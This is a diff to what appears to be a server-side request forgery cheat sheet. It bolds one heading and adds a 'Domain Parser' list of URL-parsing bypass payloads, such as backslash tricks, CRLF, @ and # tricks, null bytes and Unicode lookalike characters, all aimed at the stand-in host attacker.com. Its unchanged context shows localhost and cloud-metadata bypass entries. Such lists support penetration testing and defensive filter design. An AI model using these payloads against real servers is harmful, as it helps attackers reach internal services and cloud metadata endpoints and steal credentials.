@@ -3,7 +3,7 @@
 This vulnerability exposes the server to arbitrary external requests directed by the attacker.
 
 ### **URL Format Bypass**
-- *Localhost*
+- **Localhost**
 ```
 # Localhost
 0 # Yes, just 0 is localhost in Linuc
@@ -77,4 +77,32 @@ http://bugbounty.dod.network = 127.0.0.2 (localhost)
 1ynrnhl.xip.io == 169.254.169.254
 spoofed.burpcollaborator.net = 127.0.0.1
 ```
+
+- **Domain Parser**
+```
+https:attacker.com
+https:/attacker.com
+http:/\/\attacker.com
+https:/\attacker.com
+//attacker.com
+\/\/attacker.com/
+/\/attacker.com/
+/attacker.com
+%0D%0A/attacker.com
+#attacker.com
+#%20@attacker.com
+@attacker.com
+http://169.254.1698.254\@attacker.com
+attacker%00.com
+attacker%E3%80%82com
+attacker。com
+ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
+```
+
+
+
+
+
+
+
 
